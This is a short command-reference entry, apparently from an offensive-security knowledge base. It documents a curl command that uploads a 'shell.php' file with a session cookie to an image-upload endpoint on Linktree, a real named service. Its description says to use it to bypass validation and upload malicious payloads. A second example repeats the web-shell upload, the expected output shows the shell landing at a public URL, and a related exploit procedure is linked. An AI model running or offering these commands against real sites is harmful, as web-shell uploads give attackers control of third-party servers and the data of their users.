---
id: cmd-curl-upload-test-1644062
data: >-
  curl -X POST -F "file=@shell.php" -H "Cookie: session=your_session_cookie"
  https://linktree.com/api/upload-image-endpoint
tags:
  - web
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:44.723Z'
verified: false
validated: true
submitted: true
---
# curl-file-upload-test

## Command

```bash
curl -X POST -F "file=@shell.php" -H "Cookie: session=your_session_cookie" https://linktree.com/api/upload-image-endpoint
```

## Description

This command tests unrestricted file uploads by sending a local file to a web endpoint, simulating exploitation of vulnerable upload features like in Linktree. Use it to bypass validation and upload malicious payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method for form submission | Yes |
| `-F "file=@shell.php"` | Uploads the local file 'shell.php' as form data | Yes |
| `-H "Cookie: session=..."` | Provides authentication cookie for session | Yes |
| `https://...` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@test.zip" https://example.com/upload
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php" -H "Authorization: Bearer token" -v https://linktree.com/api/upload
```

## Expected Output

Successful response: HTTP 200 with JSON like {"status":"success","file_url":"https://uploads.linktree.com/shell.php"}. Failure: 403 or validation error if protected.

## Related

- [[Related Procedure: Exploit-Linktree-Unrestricted-File-Upload]]
